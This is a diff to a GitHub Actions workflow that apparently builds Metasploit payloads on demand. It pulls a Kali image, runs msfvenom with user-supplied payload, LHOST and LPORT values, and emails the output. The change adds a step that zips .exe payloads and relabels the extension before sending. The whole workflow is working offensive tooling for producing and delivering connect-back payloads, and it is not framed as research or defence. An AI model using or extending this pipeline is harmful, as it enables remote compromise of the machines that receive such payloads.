@@ -37,6 +37,7 @@ jobs:
     steps:
       - name: Generate Payload using Kali Docker
         run: |
+          apt-get install zip unzip -y
           docker pull kalilinux/kali-rolling
           
           # 根据用户选择的平台，设置 msfvenom 参数
@@ -84,7 +85,11 @@ jobs:
             bash -c "apt-get update && \
                      apt-get install -y metasploit-framework && \
                      msfvenom $PLATFORM $FORMAT_FLAG -p $PAYLOAD LHOST=${{ github.event.inputs.lhost }} LPORT=${{ github.event.inputs.lport }} -o '$OUTPUT_FILE'"
-          
+          if [ "${EXT}" = "exe" ]; then
+            zip ${ENAME}.zip ${ENAME}.exe
+            echo "EXT=zip" >> $GITHUB_ENV
+          fi
+            
       - name: Send email
         uses: dawidd6/action-send-mail@v11
         with:
